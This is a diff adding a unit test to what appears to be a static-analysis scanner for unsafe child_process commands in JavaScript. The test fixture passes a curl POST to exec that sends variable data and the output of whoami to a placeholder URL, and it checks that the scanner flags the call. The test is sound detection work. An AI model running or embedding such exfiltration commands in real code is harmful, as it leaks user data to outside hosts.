@@ -72,6 +72,20 @@ test("should detect csrutil command with require", () => {
   });
 });
 
+test("should transform template literal arg who are to template literal to literal", () => {
+  const code = `
+    require('child_process').exec(\`curl -X POST -d \${somevar} "$(whoami)" \${anotherVar} <URL>/c\`);
+  `;
+
+  const ast = parseScript(code);
+  const sastAnalysis = getSastAnalysis(isUnsafeCommand)
+    .execute(ast.body);
+
+  const result = sastAnalysis.warnings();
+  assert.equal(result.at(0).kind, kWarningUnsafeCommand);
+  assert.equal(result.at(0).value, `curl -X POST -d \${${0}} "$(whoami)" \${${1}} <URL>/c`);
+});
+
 test("should not detect non suspicious command", () => {
   COMMAND_TYPES.forEach((cmdType) => {
     const isArrayBased = cmdType === "spawn" || cmdType === "spawnSync";
